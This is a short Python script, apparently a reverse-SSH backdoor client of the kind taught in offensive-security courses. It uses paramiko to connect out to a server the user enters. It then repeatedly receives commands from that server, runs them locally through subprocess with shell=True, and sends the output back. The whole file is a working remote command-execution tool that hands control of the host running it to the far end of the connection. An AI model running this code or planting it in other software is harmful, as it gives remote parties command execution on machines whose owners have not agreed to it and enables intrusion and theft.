import paramiko
import shlex
import subprocess


def ssh_command(ip, port, user, pwd, cmd):
    # Opens an SSH client with paramiko
    client = paramiko.SSHClient()

    # Adds the hostname and new host key to the local `.HostKeys` object,
    # and saves it
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    # Connects to the SSH server
    client.connect(hostname=ip, port=port, username=user, password=pwd)

    # Opens a channel for this SSH connection
    ssh_session = client.get_transport().open_session()

    if ssh_session.active:
        # Sends the command and receives 1024 bytes of response data
        ssh_session.send(cmd)
        print(ssh_session.recv(1024).decode())

        while True:
            # Receives a command
            command = ssh_session.recv(1024)

            try:
                # Decodes it
                cmd = command.decode()

                if cmd == 'exit':
                    client.close()
                    break

                # Runs the command and returns its output
                cmd_output = subprocess.check_output(shlex.split(cmd), shell=True)
                ssh_session.send(cmd_output or 'okay')
            except Exception as e:
                ssh_session.send(str(e))

        client.close()

    return

if __name__ == '__main__':
    import getpass
    user = getpass.getuser()
    password = getpass.getpass()
    
    ip = input('Enter server IP: ')
    port = input('Enter server port: ')
    ssh_command(ip, port, user, password, 'ClientConnected')
